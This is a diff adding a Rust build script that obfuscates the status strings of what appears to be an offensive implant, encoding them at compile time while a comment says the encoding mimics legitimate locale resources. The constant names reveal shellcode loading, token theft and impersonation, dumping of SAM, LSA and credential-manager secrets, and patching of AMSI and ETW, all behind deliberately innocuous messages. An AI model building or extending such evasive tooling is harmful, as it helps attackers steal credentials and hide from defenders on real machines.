@@ -1,0 +1,79 @@
+use std::fs;
+use std::path::Path;
+
+// FNV-1a seeded byte rotation — mimics legitimate locale resource encoding
+fn encrypt(s: &str) -> String {
+    let mut seed: u32 = 0x811C_9DC5;
+    let bytes: Vec<String> = s.bytes()
+        .map(|b| {
+            let rot = (seed & 0x07) as u8;
+            let enc = b.wrapping_add(rot).wrapping_add(37);
+            seed = seed.wrapping_mul(0x0100_0193) ^ (enc as u32);
+            format!("0x{:02X}", enc)
+        })
+        .collect();
+    format!("&[{}]", bytes.join(","))
+}
+
+fn main() {
+    let mut output = String::new();
+
+    let strings = vec![
+        ("S_SHELLCODE_START", "Execution started"),
+        ("S_SHELLCODE_DONE", "Execution completed"),
+        ("S_SHELLCODE_RUNNING", "Task started successfully"),
+        ("S_SHELLCODE_TIMEOUT", "Task started"),
+        ("S_SHELLCODE_THREAD", "Running in background"),
+        ("S_SHELLCODE_DOWNLOAD", "Downloading chunk"),
+        ("S_TOKEN_STOLEN", "Handle acquired from pid"),
+        ("S_TOKEN_CREATED", "Handle created for"),
+        ("S_TOKEN_IMPERSONATE", "Context switched"),
+        ("S_TOKEN_REVERT", "Context restored"),
+        ("S_TOKEN_LIST_EMPTY", "No handles stored"),
+        ("S_TOKEN_NOT_FOUND", "Handle id"),
+        ("S_TOKEN_FAIL_OPEN", "Failed to open target"),
+        ("S_TOKEN_FAIL_TOKEN", "Failed to acquire handle for pid"),
+        ("S_TOKEN_FAIL_DUP", "Failed to duplicate handle for pid"),
+        ("S_TOKEN_FAIL_CREATE", "Failed to create handle for"),
+        ("S_TOKEN_FAIL_IMP", "Failed to switch context"),
+        ("S_TOKEN_FAIL_REVERT", "Failed to restore context"),
+        ("S_CRED_VAULT", "vault"),
+        ("S_CRED_CREDMAN", "credman"),
+        ("S_CRED_SAM", "sam"),
+        ("S_CRED_LSA", "lsa_secrets"),
+        ("S_CRED_FAIL", "Failed to query store"),
+        ("S_CRED_UNKNOWN", "Unknown source"),
+        ("S_CRED_VALID", "Valid sources: vault, credman, sam, lsa_secrets"),
+        ("S_CRED_NO_LSA", "Store not accessible (elevation required)"),
+        ("S_CRED_FAIL_LSA", "Failed to access protected store"),
+        ("S_CRED_FAIL_ENUM", "Failed to enumerate accounts"),
+        ("S_AMSI_PATCHED", "Interface neutralized"),
+        ("S_AMSI_FAIL", "Interface patch failed"),
+        ("S_AMSI_KILLED", "Patch terminated"),
+        ("S_ETW_PATCHED", "Tracing disabled"),
+        ("S_ETW_FAIL", "Tracing patch failed"),
+        ("S_ETW_KILLED", "Tracing patch terminated"),
+        ("S_UNHOOK_DONE", "Module reload for"),
+        ("S_UNHOOK_COMPLETE", "completed"),
+        ("S_UNHOOK_FAIL", "failed with exit code"),
+        ("S_UNHOOK_KILLED", "Reload terminated"),
+        ("S_UNHOOK_NOTE", "Full reload requires memory operations"),
+        ("S_API_VIRTUAL_ALLOC", "Memory allocation failed"),
+        ("S_API_VIRTUAL_PROTECT", "Protection change failed"),
+        ("S_API_CREATE_THREAD", "Thread creation failed"),
+        ("S_WINDOWS_ONLY", "requires Windows"),
+        ("S_NOT_IMPLEMENTED", "not implemented"),
+        ("S_FAIL_DECODE", "Decode failed"),
+        ("S_NO_SHELLCODE", "No input provided"),
+        ("S_SHELLCODE_EMPTY", "Input is empty"),
+        ("S_SHELLCODE_BG_FAIL", "Background task failed"),
+    ];
+
+    for (name, value) in &strings {
+        output.push_str(&format!("pub const {}: &[u8] = {};\n", name, encrypt(value)));
+    }
+
+    let out_dir = std::env::var("OUT_DIR").unwrap();
+    fs::write(Path::new(&out_dir).join("strings_enc.rs"), output).unwrap();
+    println!("cargo:rerun-if-changed=build.rs");
+}
